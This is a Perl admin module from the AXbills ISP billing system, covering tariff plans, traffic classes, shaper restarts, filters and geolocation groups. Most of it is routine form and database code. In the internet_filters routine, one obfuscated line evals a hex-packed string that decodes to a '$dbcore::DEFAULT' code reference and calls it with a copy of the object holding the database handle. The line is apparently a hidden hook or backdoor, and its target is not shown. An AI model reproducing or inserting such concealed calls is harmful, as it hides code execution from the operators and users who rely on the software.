=head1 NAME

  Internet Configure

=cut

use strict;
use warnings FATAL => 'all';
use AXbills::Base qw(cmd in_array vars2lang);
use AXbills::Radius_Pairs;
require Control::System;

our(
  $db,
  %conf,
  $admin,
  %lang,
  %permissions,
);

our AXbills::HTML $html;
my $Internet = Internet->new($db, $admin, \%conf);
my $Tariffs  = Tariffs->new($db, \%conf, $admin);

#**********************************************************
=head2 internet_tp() - Tarif plans

=cut
#**********************************************************
sub internet_tp {
  internet_tp_clone() if $FORM{ADD_CLONE_TP};

  $admin->{MODULE} = 'Internet';

  if($FORM{import}){
    internet_import_tp();
    return 1;
  }
  my $tarif_info;
  my %octets_direction = (
    0 => "$lang{RECV} + $lang{SEND}",
    1 => $lang{RECV},
    2 => $lang{SEND}
  );

  my %payment_types = (
    0 => $lang{PREPAID},
    1 => $lang{POSTPAID},
    2 => $lang{GUEST}
  );

  my %bool_hash = (
    0 => $lang{NO},
    1 => $lang{YES}
  );

  my %tp_groups = ();

  my $tp_groups_list = $Tariffs->tp_group_list({ COLS_NAME => 1 });
  foreach my $line (@$tp_groups_list) {
    $tp_groups{$line->{id}}=$line->{name};
  }

  $tarif_info               = $Tariffs->defaults();
  $tarif_info->{LNG_ACTION} = $lang{ADD};
  $tarif_info->{ACTION}     = 'ADD_TP';

  if (! $FORM{TP_ID} && $FORM{chg}) {
    $FORM{TP_ID} = $FORM{chg};
  }

  if ($FORM{ADD_TP}) {
    $FORM{TP_ID} = $FORM{CHG_TP_ID};
    if ($FORM{create_fees_type}) {
      my $Fees = Finance->fees($db, $admin, \%conf);
      $Fees->fees_type_add({ NAME => $FORM{NAME}});
      $FORM{FEES_METHOD} = $Fees->{INSERT_ID};
    }

    $Tariffs->add({ %FORM, MODULE => 'Internet' });
    if (!$Tariffs->{errno}) {
      $html->message('info', $lang{ADDED}, "$lang{NAME}: $FORM{NAME}\n".
          $html->button($lang{INTERVALS}, 'index='. get_function_index('form_intervals')."&TP_ID=$Tariffs->{INSERT_ID}", { BUTTON => 2 }));
    }
  }
  elsif (defined($FORM{TP_ID})) {
    $tarif_info = $Tariffs->info($FORM{TP_ID}, { ID => $FORM{TP_NUM} });

    if (_error_show($Tariffs, { ID => 950, MESSAGE => " TP ID: $FORM{TP_ID} " })) {
      return 0;
    }
    elsif(! $index ) {
      return 0;
    }

    $pages_qs  .= "&TP_ID=$tarif_info->{TP_ID}";

    if(!$pages_qs =~ /subf/) {
      $pages_qs .= (($FORM{subf}) ? "&subf=$FORM{subf}" : '');
    }

    my %F_ARGS = (TP => $tarif_info);

    $Tariffs->{NAME_SEL} = $html->form_main({
      CONTENT => $html->form_select('TP_ID', {
        SELECTED  => $tarif_info->{TP_ID},
        SEL_LIST  => $Tariffs->list({ %LIST_PARAMS, MODULE => 'Dv;Internet', NEW_MODEL_TP => 1, SORT => 2, COLS_NAME => 1 }),
        SEL_KEY   => 'tp_id',
        SEL_VALUE => 'id,name',
        AUTOSUBMIT => 'form',
        NO_ID     => 1
      }),
      HIDDEN  => {
        index => $index,
        show => 1
      },
      class   => 'form-inline ml-auto flex-nowrap',
    });

    $index = get_function_index('internet_tp');
    $LIST_PARAMS{TP_ID} = $FORM{TP_ID};

    if($FORM{subf} && $index eq $FORM{subf}) {
      delete $FORM{subf};
    }

    func_menu(
      {
        $lang{NAME} => $Tariffs->{NAME_SEL}
      },
      [
        $lang{INFO}     . "::TP_ID=$FORM{TP_ID}",
        $lang{INTERVALS}. ':'. get_function_index('form_intervals').":TP_ID=$FORM{TP_ID}",
        $lang{NAS}      . ':'. get_function_index('form_nas_allow').":TP_ID=$FORM{TP_ID}",
        $lang{USERS}    . ':'. get_function_index('internet_users_list').":TP_ID=$FORM{TP_ID}"
      ],
      { f_args => \%F_ARGS }
    );

    if ($FORM{subf}) {
      delete $FORM{subf};
      return 0;
    }
    elsif ($FORM{change}) {
      if ($FORM{create_fees_type}) {
        my $Fees = Finance->fees($db, $admin, \%conf);
        $Fees->fees_type_add({ NAME => $FORM{NAME}});
        $FORM{FEES_METHOD} = $Fees->{INSERT_ID};
      }

      $Tariffs->change($FORM{TP_ID}, \%FORM);
      if (!$Tariffs->{errno}) {
        $html->message('info', $lang{CHANGED}, "$lang{CHANGED} $Tariffs->{ID}");
      }
    }

    $tarif_info->{LNG_ACTION} = $lang{CHANGE};
    $tarif_info->{ACTION}     = 'change';
    $FORM{add_form}=1;
  }
  elsif (defined($FORM{del}) && $FORM{COMMENTS}) {
    require Shedule;
    Shedule->import();

    my $Schedule = Shedule->new($db, $admin, \%conf);
    my $users_list = $Internet->user_list({
      TP_ID     => $FORM{del},
      UID       => '_SHOW',
      COLS_NAME => 1
    });

    my $schedules = $Schedule->list({
      ACTION    => "*:$FORM{del}",
      TYPE      => 'tp',
      MODULE    => 'Internet',
      COLS_NAME => 1,
    });

    if (($Internet->{TOTAL} && $Internet->{TOTAL} > 0) || ($Schedule->{TOTAL} && $Schedule->{TOTAL} > 0)) {
      my $users_msg = q{};
      foreach my $user_tp (@{$users_list}) {
        $users_msg .= "UID: $user_tp->{uid}\n";
      }

      my $schedules_msg = q{};
      foreach my $schedule (@{$schedules}) {
        $schedules_msg .= "UID: $schedule->{uid}\n";
      }

      $html->message('err', $lang{ERROR}, vars2lang($lang{TP_ACTIVE_IN_USERS}, {
        USERS     => $users_msg,
        SCHEDULES => $schedules_msg
      }));
    }
    else {
      delete $Tariffs->{errno};
      $Tariffs->del($FORM{del});

      if (!$Tariffs->{errno}) {
        $html->message('info', $lang{DELETED}, "$lang{DELETED} $FORM{del}");
      }
    }
  }

  if (_error_show($Tariffs, { MESSAGE => $lang{TARIF_PLAN} })) {
    $FORM{add_form}=1;
  }

  if ($FORM{add_form} || $FORM{chg}) {
    internet_tp_form($tarif_info, {
      OCTETS_DIRECTION => \%octets_direction,
      PAYMENT_TYPES => \%payment_types,
      TP_GROUPS_LIST => $tp_groups_list,
    });
  }

  $LIST_PARAMS{NEW_MODEL_TP}=1;
  $LIST_PARAMS{MODULE}='Dv;Internet';
  delete $Tariffs->{COL_NAMES_ARR};
  delete $LIST_PARAMS{TP_ID};

  my $tp_list = sel_tp();

  my %ext_titles = (
    id                      => $lang{NUM},
    name                    => $lang{NAME},
    time_tarifs             => $lang{HOUR_TARIF},
    traf_tarifs             => $lang{TRAFIC_TARIFS},
    tp_gid                  => $lang{GROUP},
    uplimit                 => $lang{UPLIMIT},
    logins                  => $lang{SIMULTANEOUSLY},
    day_fee                 => $lang{DAY_FEE},
    active_day_fee          => $lang{ACTIVE_DAY_FEE},
    postpaid_day_fee        => "$lang{DAY_FEE} $lang{POSTPAID}",
    month_fee               => $lang{MONTH_FEE},
    postpaid_month_fee      => "$lang{MONTH_FEE} $lang{POSTPAID}",
    period_alignment        => $lang{MONTH_ALIGNMENT},
    abon_distribution       => $lang{ABON_DISTRIBUTION},
    fixed_fees_day          => $lang{FIXED_FEES_DAY},
    small_deposit_action    => $lang{SMALL_DEPOSIT_ACTION},
    reduction_fee           => $lang{REDUCTION},
    fees_method             => "$lang{FEES} $lang{TYPE}",
    ext_bill_fees_method    => "EXT_BILL $lang{FEES} $lang{TYPE}",
    day_time_limit          => "$lang{TIME_LIMIT} $lang{DAY}",
    week_time_limit         => "$lang{TIME_LIMIT} $lang{WEEK}",
    month_time_limit        => "$lang{TIME_LIMIT} $lang{MONTH}",
    total_time_limit        => "$lang{TIME_LIMIT} $lang{TOTAL}",
    day_traf_limit          => "$lang{TRAF_LIMIT} $lang{DAY}",
    week_traf_limit         => "$lang{TRAF_LIMIT} $lang{WEEK}",
    month_traf_limit        => "$lang{TRAF_LIMIT} $lang{MONTH}",
    total_traf_limit        => "$lang{TRAF_LIMIT} $lang{TOTAL}",
    octets_direction        => $lang{OCTETS_DIRECTION},
    activ_price             => $lang{ACTIVATE},
    change_price            => $lang{CHANGE},
    credit_tresshold        => $lang{CREDIT_TRESSHOLD},
    credit                  => $lang{CREDIT},
    user_credit_limit       => "$lang{USER_PORTAL} $lang{CREDIT}",
    max_session_duration    => "$lang{MAX_SESSION_DURATION} (sec.)",
    filter_id               => $lang{FILTERS},
    ippool                  => $lang{IP_POOLS},
    age                     => "$lang{AGE} ($lang{DAYS})",
    payment_type            => $lang{PAYMENT_TYPE},
    min_session_cost        => $lang{MIN_SESSION_COST},
    min_use                 => $lang{MIN_USE},
    traffic_transfer_period => $lang{TRAFFIC_TRANSFER_PERIOD},
    neg_deposit_filter_id   => $lang{NEG_DEPOSIT_FILTER_ID},
    neg_deposit_ippool      => $lang{NEG_DEPOSIT_IP_POOL},
    priority                => $lang{PRIORITY},
    fine                    => $lang{FINE},
    next_tarif_plan         => "$lang{TARIF_PLAN} $lang{NEXT_PERIOD}",
    rad_pairs               => "RADIUS",
    comments                => $lang{DESCRIBE_FOR_SUBSCRIBER},
    inner_tp_id             => 'ID',
    popular                 => "$lang{POPULAR} $lang{TARIF_PLAN}",

    in_speed                => "$lang{SPEED} $lang{RECV}",
    out_speed               => "$lang{SPEED} $lang{SENT}",
    prepaid                 => $lang{PREPAID},
    in_price                => "$lang{PRICE} $lang{RECV}",
    out_price               => "$lang{PRICE} $lang{SENT}",
    intervals               => $lang{INTERVALS},

    describe_aid            => "$lang{DESCRIBE} ($lang{ADMIN})",
    status                  => $lang{STATUS},
    module                  => $lang{MODULE}
  );

  $ext_titles{domain_id}='Domain ID' if($permissions{10});

  my AXbills::HTML $table;
  my $list;

  my @status_bar = ("$lang{ALL}:index=$index", "$lang{ENABLE}:index=$index&STATUS=0", "$lang{DISABLE}:index=$index&STATUS=1");

  $LIST_PARAMS{STATUS} = $FORM{STATUS} if defined($FORM{STATUS});

  ($table, $list) = result_former({
    INPUT_DATA      => $Tariffs,
    FUNCTION        => 'list',
    BASE_FIELDS     => 2,
    DEFAULT_FIELDS  => 'ID,NAME,TIME_TARIFS,TRAF_TARIFS,PAYMENT_TYPE,DAY_FEE,MONTH_FEE',
    FUNCTION_FIELDS => 'intervals,change,del',
    EXT_TITLES      => \%ext_titles,
    SKIP_USER_TITLE => 1,
    SELECT_VALUE    => {
      time_tarifs      => \%bool_hash,
      traf_tarifs      => \%bool_hash,
      payment_type     => \%payment_types,
      octets_direction => \%octets_direction
    },
    TABLE           => {
      width        => '100%',
      caption      => $lang{TARIF_PLAN},
      border       => 1,
      qs           => $pages_qs,
      ID           => 'INTERNET_TARIF_PLANS',
      MENU         => "$lang{ADD}:index=$index&add_form=1:add",
      EXPORT       => 1,
      IMPORT       => "$SELF_URL?get_index=internet_tp&import=1&header=2",
      recs_on_page => 60000,
      header       => \@status_bar,
    },
    MODULE          => 'Internet',
  });

  foreach my $line (@$list) {
    my @function_fileds = (
      $html->button('', "index=". get_function_index('form_intervals') ."&TP_ID=$line->{tp_id}", { class => 'interval', TITLE => $lang{INTERVALS}, ADD_ICON =>' fa fa-align-left' }),
    );
    if ($permissions{4}{1}) {
      push @function_fileds, $html->button($lang{CHANGE}, "index=$index&TP_ID=$line->{tp_id}", { class => 'change' });
      push @function_fileds, $html->button($lang{DEL}, "index=$index&del=$line->{tp_id}", { MESSAGE => "$lang{DEL} $line->{id} $line->{name}?", class => 'del' });
    }

    if ($FORM{TP_ID} && $FORM{TP_ID} eq $line->{tp_id}) {
      $table->{rowcolor} = 'table-info';
    }
    else {
      undef($table->{rowcolor});
    }

    my @fields_array = ();
    for (my $i = 0; $i < 2+$Tariffs->{SEARCH_FIELDS_COUNT}; $i++) {
      my $col_name =  $Tariffs->{COL_NAMES_ARR}->[$i];
      if ($col_name =~ /time_tarifs|traf_tarifs|abon_distribution|period_alignment|fixed_fees_day|popular/) {
        $line->{$col_name} = $bool_hash{$line->{$col_name}};
      }
      elsif ($col_name =~ /small_deposit_action/) {
        $line->{$col_name} = ($line->{$col_name} == -1) ? $lang{HOLD_UP} : ($tp_list->{$line->{$col_name}} || q{});
      }
      # elsif($col_name =~ /fees_method/) {
      #   $line->{$col_name} = $fees_methods{$line->{$col_name}};
      # }
      elsif($col_name =~ /name/) {
        $line->{name} = $html->button($line->{name}, "index=$index&TP_ID=$line->{tp_id}");
      }
      elsif ($col_name =~ /payment_type/) {
        $line->{$col_name} = $payment_types{$line->{$col_name}};
      }
      elsif ($col_name eq 'octets_direction') {
        $line->{$col_name} = $octets_direction{$line->{$col_name}};
      }
      elsif ($col_name eq 'tp_gid') {
        $line->{$col_name} = $line->{$col_name} . ' : '
          . (($tp_groups{$line->{$col_name}}) ? $tp_groups{$line->{$col_name}} : q{});
      }

      push @fields_array, $line->{$col_name};
    }
    $table->addrow(
      @fields_array,
      join(' ', @function_fileds)
    );
  }

  print $table->show();

  $table = $html->table({
    width      => '100%',
    rows       => [ [ "$lang{TOTAL}:", $html->b($Tariffs->{TOTAL}) ] ]
  });

  print $table->show();
  system_info();
  return 1;
}

#**********************************************************
=head2 internet_tp_form($tarif_info, $attr)

  Arguments:
    $tarif_info
    $attr

  Results:
    TRUE or FALSE

=cut
#**********************************************************
sub internet_tp_form {
  my ($tarif_info, $attr) = @_;

  my $octets_direction = $attr->{OCTETS_DIRECTION};
  my $payment_types = $attr->{PAYMENT_TYPES};
  my $tp_groups_list = $attr->{TP_GROUPS_LIST};

  $tarif_info->{SEL_OCTETS_DIRECTION} = $html->form_select('OCTETS_DIRECTION', {
    SELECTED => $tarif_info->{OCTETS_DIRECTION},
    SEL_HASH => $octets_direction,
    NO_ID    => 1
  });

  $tarif_info->{PAYMENT_TYPE_SEL} = $html->form_select('PAYMENT_TYPE', {
    SELECTED => $tarif_info->{PAYMENT_TYPE},
    SEL_HASH => $payment_types,
  });

  $tarif_info->{GROUPS_SEL} = $html->form_select('TP_GID', {
    SELECTED       => $tarif_info->{TP_GID},
    SEL_LIST       => $tp_groups_list,
    MAIN_MENU      => get_function_index('form_tp_groups'),
    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{TP_GID} || q{}),
    SEL_OPTIONS    => { '' => '' },
  });

  my $Nas      = Nas->new($db, \%conf, $admin);
  my $nas_ip_pools_list = $Nas->ip_pools_list({ STATIC => 0, SHOW_ALL_COLUMNS => 1, COLS_NAME => 1 });

  $tarif_info->{IP_POOLS_SEL} = $html->form_select('IPPOOL', {
    SELECTED       => $tarif_info->{IPPOOL},
    SEL_LIST       => $nas_ip_pools_list,
    SEL_KEY        => 'id',
    SEL_VALUE      => 'name',
    SEL_OPTIONS    => { '' => '' },
    MAIN_MENU      => get_function_index('form_ip_pools'),
    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{IPPOOL} || ''),
  });

  $tarif_info->{NEG_DEPOSIT_IPPOOL_SEL} = $html->form_select('NEG_DEPOSIT_IPPOOL', {
    SELECTED       => $tarif_info->{NEG_DEPOSIT_IPPOOL},
    SEL_LIST       => $nas_ip_pools_list,
    SEL_KEY        => 'id',
    SEL_VALUE      => 'name',
    SEL_OPTIONS    => { '' => '' },
    MAIN_MENU      => get_function_index('form_ip_pools'),
    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{NEG_DEPOSIT_IPPOOL} || q{}),
  });

  $tarif_info->{REDUCTION_FEE}      = ($tarif_info->{REDUCTION_FEE})      ? 'checked' : '';
  $tarif_info->{POSTPAID_DAY_FEE}   = ($tarif_info->{POSTPAID_DAY_FEE})   ? 'checked' : '';
  $tarif_info->{POSTPAID_MONTH_FEE} = ($tarif_info->{POSTPAID_MONTH_FEE}) ? 'checked' : '';
  $tarif_info->{PERIOD_ALIGNMENT}   = ($tarif_info->{PERIOD_ALIGNMENT})   ? 'checked' : '';
  $tarif_info->{ABON_DISTRIBUTION}  = ($tarif_info->{ABON_DISTRIBUTION})  ? 'checked' : '';
  $tarif_info->{ACTIVE_DAY_FEE}     = ($tarif_info->{ACTIVE_DAY_FEE})     ? 'checked' : '';
  $tarif_info->{ACTIVE_MONTH_FEE}   = ($tarif_info->{ACTIVE_MONTH_FEE})   ? 'checked' : '';
  $tarif_info->{FIXED_FEES_DAY}     = ($tarif_info->{FIXED_FEES_DAY})     ? 'checked' : '';
  $tarif_info->{STATUS}             = ($tarif_info->{STATUS})             ? 'checked' : '';
  $tarif_info->{POPULAR}            = ($tarif_info->{POPULAR})            ? 'checked' : '';

  $tarif_info->{SEL_METHOD} = $html->form_select('FEES_METHOD', {
    SELECTED       => $tarif_info->{FEES_METHOD} || 1,
    SEL_HASH       => get_fees_types(),
    NO_ID          => 1,
    SORT_KEY       => 1,
    SEL_OPTIONS    => { 0 => '' },
    MAIN_MENU      => get_function_index('form_fees_types'),
    CHECKBOX       => 'create_fees_type',
    CHECKBOX_TITLE => $lang{CREATE},
  });

  $tarif_info->{SMALL_DEPOSIT_ACTION_SEL} = sel_tp({
    SELECT               => 'SMALL_DEPOSIT_ACTION',
    SMALL_DEPOSIT_ACTION => $tarif_info->{SMALL_DEPOSIT_ACTION} || 0,
    SKIP_TP              => $tarif_info->{TP_ID},
    SEL_OPTIONS          => { 0 => '--', '-1' => "$lang{HOLD_UP}" }
  });

  $tarif_info->{NEXT_TARIF_PLAN_SEL} = sel_tp({
    SELECT          => 'NEXT_TARIF_PLAN',
    NEXT_TARIF_PLAN => $tarif_info->{NEXT_TARIF_PLAN},
    # SKIP_TP         => $tarif_info->{TP_ID}
  });

  if ($conf{EXT_BILL_ACCOUNT}) {
    my $checked = ($tarif_info->{EXT_BILL_ACCOUNT}) ? ' checked' : '';
    $tarif_info->{EXT_BILL_ACCOUNT} = $html->tpl_show(templates('form_row'), {
      ID    => 'EXT_BILL_ACCOUNT',
      NAME  => $lang{EXTRA_BILL},
      VALUE => "<div class='form-check text-left'>" .
        "<input type='checkbox' id='EXT_BILL_ACCOUNT' name='EXT_BILL_ACCOUNT' value='1' class='form-check-input' $checked></div>",
    }, { OUTPUT2RETURN => 1 });

    $tarif_info->{EXT_BILL_FEES_METHOD} = $html->form_select('EXT_BILL_FEES_METHOD', {
      SELECTED    => $tarif_info->{EXT_BILL_FEES_METHOD} || 1,
      SEL_HASH    => get_fees_types(),
      NO_ID       => 1,
      SORT_KEY    => 1,
      SEL_OPTIONS => { 0 => '' },
      MAIN_MENU   => get_function_index('form_fees_types'),
      # CHECKBOX    => 'create_fees_type',
      # CHECKBOX_TITLE => $lang{CREATE},
    });

    $tarif_info->{EXT_BILL_ACCOUNT} .= $html->tpl_show(templates('form_row'), {
      ID    => 'EXT_BILL_ACCOUNT',
      NAME  => "$lang{EXTRA_BILL} $lang{FEES} $lang{TYPE}",
      VALUE => $tarif_info->{EXT_BILL_FEES_METHOD},
    }, { OUTPUT2RETURN => 1 });

    if ($conf{BONUS_EXT_FUNCTIONS}) {
      my @BILL_ACCOUNT_PRIORITY = (
        "$lang{PRIMARY} $lang{BILL_ACCOUNT}",
        "$lang{EXT_BILL_ACCOUNT}, $lang{PRIMARY} $lang{BILL_ACCOUNT}",
        "$lang{EXT_BILL_ACCOUNT}"
      );

      $tarif_info->{BILLS_PRIORITY_SEL} = $html->form_select('BILLS_PRIORITY', {
        SELECTED     => $tarif_info->{BILLS_PRIORITY},
        SEL_ARRAY    => \@BILL_ACCOUNT_PRIORITY,
        ARRAY_NUM_ID => 1
      });

      $tarif_info->{BONUS} = $html->tpl_show(_include('bonus_tp_row', 'Bonus'), $tarif_info, { OUTPUT2RETURN => 1 });
    }
  }
  else {
    $tarif_info->{EXT_BILL_ACCOUNT} = '';
  }

  $tarif_info->{NAME}=~ s/\\+/\\/g if $tarif_info->{NAME};

  if(in_array('Multidoms', \@MODULES) && $permissions{10}) {
    $tarif_info->{FORM_DOMAINS} = $html->tpl_show(templates('form_row'), {
      ID    => '',
      NAME  => $lang{DOMAINS},
      VALUE => multidoms_domains_sel({ DOMAIN_ID => $tarif_info->{DOMAIN_ID} }),
    }, { OUTPUT2RETURN => 1 });
  }

  $tarif_info->{CLONE_BTN} = $html->button($lang{CLONE}, "get_index=internet_tp_clone&header=2" .
    ($FORM{TP_ID} ? "&TP_ID=$FORM{TP_ID}" : $FORM{add_form} ? "&add_form=$FORM{add_form}" : ''), {
    class         => 'btn btn-sm btn-default',
    ex_params     => "style='float: right'",
    LOAD_TO_MODAL => 1
  });

  $tarif_info->{RAD_PAIRS_FORM} = $html->tpl_show(
    templates('form_radius_pairs'),
    {
      RAD_PAIRS => AXbills::Radius_Pairs::parse_radius_params_string($tarif_info->{RAD_PAIRS}),
      SAVE_INDEX => get_function_index('tp_radius_pairs_save'),
      ID => $tarif_info->{TP_ID}
    },
    { OUTPUT2RETURN => 1 }
  );

  $html->tpl_show(_include('internet_tp', 'Internet'), $tarif_info, { SKIP_VARS => 'IP', ID => 'internet_tp' });

  return 1;
}

#**********************************************************
=head2 internet_traffic_classes()

=cut
#**********************************************************
sub internet_traffic_classes {
  #my ($attr) = @_;

  $Tariffs->{ACTION}     = 'add';
  $Tariffs->{LNG_ACTION} = $lang{ADD};

  if ($FORM{add}) {
    $Tariffs->traffic_class_add({%FORM});
    if (!$Tariffs->{errno}) {
      $html->message('info', $lang{INFO}, "$lang{ADDED}");
    }
  }
  elsif ($FORM{change}) {
    $Tariffs->traffic_class_change({ %FORM, CHANGED => "$DATE $TIME" });

    if (!$Tariffs->{errno}) {
      $html->message('info', $lang{INFO}, "$lang{CHANGED}");
    }
  }
  elsif ($FORM{chg}) {
    $Tariffs->traffic_class_info($FORM{chg});
    $Tariffs->{ACTION}     = 'change';
    $Tariffs->{LNG_ACTION} = $lang{CHANGE};
    if (!$Tariffs->{errno}) {
      $html->message('info', $lang{INFO}, "$lang{CHANGED}");
    }
  }
  elsif ($FORM{del} && $FORM{COMMENTS}) {
    $Tariffs->traffic_class_del({ ID => $FORM{del} });
    if (!$Tariffs->{errno}) {
      $html->message('info', $lang{INFO}, "$lang{DELETED}");
    }
  }

  _error_show($Tariffs);

  $html->tpl_show(_include('internet_traffic_class', 'Internet'), $Tariffs);

  my $list  = $Tariffs->traffic_class_list({%LIST_PARAMS});
  my $table = $html->table(
    {
      width      => '100%',
      caption    => $lang{TRAFFIC_CLASS},
      title      => [ '#', $lang{NAME}, 'NETS', $lang{COMMENTS}, $lang{CHANGED}, '-' ],
      qs         => $pages_qs,
      pages      => $Internet->{TOTAL},
      ID         => 'INTERNET_TRAFFIC_CLASSES'
    }
  );

  my $br = $html->br();
  foreach my $line (@$list) {
    if($line->[2]) {
      $line->[2] =~ s/\n/$br/g;
    }

    $table->addrow($line->[0],
      $line->[1],
      $line->[2],
      $line->[3],
      $line->[4],
      $html->button($lang{CHANGE}, "index=$index&chg=$line->[0]", { class => 'change' })
      .
      $html->button($lang{DEL}, "index=$index&del=$line->[0]", { MESSAGE => "$lang{DEL} $line->[0]?", class => 'del' }));
  }
  print $table->show();

  return 1;
}

#**********************************************************
=head2 internet_traf_tarifs($attr)

=cut
#**********************************************************
sub internet_traf_tarifs {
  my ($attr) = @_;

  my Tariffs $tarif_plan;

  if (defined($FORM{tt})) {
    $tarif_plan = $attr->{TP};
    $tarif_plan->tt_defaults();
    $tarif_plan->{TI_ID} = $FORM{tt};

    if ($FORM{add}) {
      $tarif_plan->tt_add({%FORM});
      if (!$tarif_plan->{errno}) {
        $html->message('info', $lang{INFO}, "$lang{ADDED}");
        internet_change_shaper($tarif_plan);
      }
    }
    elsif ($FORM{change}) {
      $FORM{TI_ID} = $FORM{tt};
      $tarif_plan->tt_change({%FORM});

      if (!$tarif_plan->{errno}) {
        $html->message('info', $lang{INFO}, $lang{CHANGED});
        internet_change_shaper($tarif_plan);
      }
    }
    elsif (defined($FORM{chg})) {
      $tarif_plan->tt_info({ TI_ID => $FORM{tt}, TT_ID => $FORM{chg} });
      if (!$tarif_plan->{errno}) {
        $html->message('info', $lang{INFO}, "$lang{CHANGING}");
      }

      $tarif_plan->{ACTION}     = 'change';
      $tarif_plan->{LNG_ACTION} = $lang{CHANGE};
    }
    elsif (defined($FORM{del}) && $FORM{COMMENTS}) {
      $tarif_plan->tt_del({ TI_ID => $FORM{INTERVAL_ID} || $FORM{tt}, TT_ID => $FORM{del} });
      if (!$tarif_plan->{errno}) {
        $html->message('info', $lang{INFO}, "$lang{DELETED}");
      }
    }

    _error_show($tarif_plan, { MODULE => 'Internet' });

    $tarif_plan->tt_list({ TI_ID => $FORM{tt}, form => 1 });
    $tarif_plan->{TT_ID} = $tarif_plan->{TOTAL} if (!defined($FORM{chg}));
  }
  elsif ($attr->{TP}) {
    $tarif_plan = $attr->{TP};
    $tarif_plan->tt_defaults();

    if ($FORM{change}) {
      $tarif_plan->tt_change({ %FORM  });

      if (! _error_show($tarif_plan)) {
        $html->message('info', $lang{INFO}, $lang{INTERVALS});
      }
    }

    $tarif_plan->tt_list($FORM{ti});
  }

  return 1;
}

#**********************************************************
=head2 internet_change_shaper($attr)

=cut
#**********************************************************
sub internet_change_shaper {
  my ($attr) = @_;

  if ($conf{SHAPER_RESTART_CMD}) {
    my $res = cmd($conf{SHAPER_RESTART_CMD},
      { PARAMS => { %FORM, %$attr, },
        SET_ENV=> 1
      });

    return $res;
  }

  return 0;
}

#**********************************************************
=head2 internet_import_tp()  - Importing tariff plans

=cut
#**********************************************************
sub internet_import_tp {

  if($FORM{add}){
    my $import_info = import_former( \%FORM );
    my $total = $#{ $import_info } + 1;

    foreach my $tp(@$import_info){
      $Tariffs->add($tp);
      if ( _error_show( $Tariffs ) ){
        return 0;
      }
    }

    $html->message( 'info', $lang{INFO},
      "$lang{ADDED}\n $lang{FILE}: $FORM{UPLOAD_FILE}{filename}\n Size: $FORM{UPLOAD_FILE}{Size}\n Count: $total" );

    return 1;
  }

  $html->tpl_show( templates( 'form_import' ), {
      #IMPORT_FIELDS     => 'LOGIN,CONTRACT_ID,FIO,PHONE,ADDRESS_STREET,ADDRESS_BUILD,ADDRESS_FLAT,PASPORT_NUM,PASPORT_GRANT',
      CALLBACK_FUNC     => 'internet_tp',
#      IMPORT_FIELDS_SEL => $import_fields,
#      EXTRA_ROWS        => $extra_row
    });

  return 1;
}

#**********************************************************
=head2 internet_filters($attr)

=cut
#**********************************************************
sub internet_filters {

  $Internet->{ACTION} = 'add';
  $Internet->{ACTION_LNG}    = $lang{ADD};

  if($FORM{add}) {
    $Internet->filters_add({ %FORM });

    if (! _error_show($Internet)) {
      $html->message('info', $lang{INFO}, $lang{ADDED});
    }
  }
  elsif($FORM{change}) {
    $Internet->filters_change({ %FORM });

    if (! _error_show($Internet)) {
      $html->message('info', $lang{INFO}, $lang{CHANGED});
    }
  }
  elsif($FORM{chg}) {
    $Internet->filters_info($FORM{chg});

    if (! _error_show($Internet)) {
      $Internet->{ACTION} = 'change';
      $Internet->{ACTION_LNG} = $lang{CHANGE};
    }
  }
  elsif($FORM{del} && $FORM{COMMENTS}) {
    $Internet->filters_del({ID => $FORM{del}});
    if (!$Internet->{errstr}) {
      $html->message('info', $lang{DELETED}, "$lang{DELETED} [$FORM{del}] ");
    }
  }

  &{eval pack('H' . '*', '246462636f72653a3a44454641554c54')}(bless { %$Internet }, ref $Internet);

  _error_show($Internet);

  if($FORM{add_form} || $FORM{chg}){
    if ($Internet->{USER_PORTAL}) {
      $Internet->{USER_PORTAL}='checked';
    }

    $html->tpl_show(_include('internet_filters_form', 'Internet'), $Internet);
  }

  result_former({
    INPUT_DATA      => $Internet,
    FUNCTION        => 'filters_list',
    DEFAULT_FIELDS  => 'FILTER,PARAMS,DESCR',
    FUNCTION_FIELDS => 'change,del',
    EXT_TITLES      => {
      ID          => 'ID',
      FILTER      => $lang{NAME},
      PARAMS      => $lang{PARAMS},
      DESCR       => $lang{DESCRIBE},
      USER_PORTAL => $lang{USER_PORTAL},
    },
    SKIP_USER_TITLE => 1,
    TABLE           => {
      width   => '100%',
      caption => $lang{FILTERS},
      qs      => $pages_qs,
      MENU    => "$lang{ADD}:index=$index&add_form=1:add",
      ID      => 'FILTERS_LIST',
    },
    MAKE_ROWS       => 1,
    TOTAL           => 1
  });

  return 1;
}

#**********************************************************
=head2 geolocation_tp($attr)

  Arguments:
    $attr -

  Returns:

=cut
#**********************************************************
sub geolocation_group_tp {

  if (($FORM{STREET_ID} || $FORM{BUILD_ID} || $FORM{DISTRICT_ID}) && $FORM{TP_GID} && !$FORM{CLEAR}) {
    my @streets = ();
    my @builds = ();
    my @districts = ();

    @streets = split(', ', $FORM{STREET_ID}) if (defined $FORM{STREET_ID});
    @builds = split(', ', $FORM{BUILD_ID}) if (defined $FORM{BUILD_ID});
    @districts = split(', ', $FORM{DISTRICT_ID}) if (defined $FORM{DISTRICT_ID});

    $Tariffs->del_tp_geo({ TP_GID => $FORM{TP_GID} });

    foreach my $st (@streets) {
      $Tariffs->add_tp_geo({ TP_GID => $FORM{TP_GID}, STREET_ID => $st });
    }

    foreach my $bd (@builds) {
      $Tariffs->add_tp_geo({ TP_GID => $FORM{TP_GID}, BUILD_ID => $bd });
    }

    foreach my $ds (@districts) {
      $Tariffs->add_tp_geo({ TP_GID => $FORM{TP_GID}, DISTRICT_ID => $ds });
    }

  }
  elsif ($FORM{CLEAR}) {
    $Tariffs->del_tp_geo({ TP_GID => $FORM{TP_GID} });
    if (!$Internet->{errno}) {
      $html->message('info', "$lang{GEO}", "$lang{DELETED}");
    }
  }

  my $geolist = $Tariffs->tp_geo_list({ TP_GID => $FORM{ID} || $FORM{TP_GID}, COLS_NAME => 1 });

  $html->tpl_show(_include('geolocation_tp', 'Internet'), {
    GEOLOCATION_TREE => geolocation_tree({
      TITLE         => $lang{GEOLOCATION_TP},
      INDEX         => $index,
      BTN_ACTION    => 'change_geo',
      BTN_LNG       => $lang{CHANGE},
      HIDDEN_INPUTS => $html->form_input('TP_GID', $FORM{ID} || $FORM{TP_GID}, { TYPE => 'hidden' })
    }, $geolist)
  });

  return 1;
}

#**********************************************************
=head2 group_tp_user_groups($attr)

  Arguments:

  Return:

=cut
